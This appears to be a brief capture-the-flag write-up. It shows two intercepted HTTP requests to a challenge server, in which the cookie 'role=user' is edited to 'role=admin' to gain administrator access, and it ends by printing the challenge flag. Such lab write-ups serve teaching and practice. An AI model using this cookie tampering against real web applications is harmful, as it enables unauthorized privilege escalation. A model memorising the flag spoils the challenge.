
Go the the web page, intercept the request, the request will look like this

```http
GET / HTTP/1.1

Host: 3.23.56.243:9002

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: close

Cookie: role=user

Upgrade-Insecure-Requests: 1
```

Change the role value to admin and forward the request

```http
GET / HTTP/1.1

Host: 3.23.56.243:9002

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: close

Cookie: role=admin

Upgrade-Insecure-Requests: 1
```

And we get the flag

Flag : texsaw{cR@zy_c00Ki3}

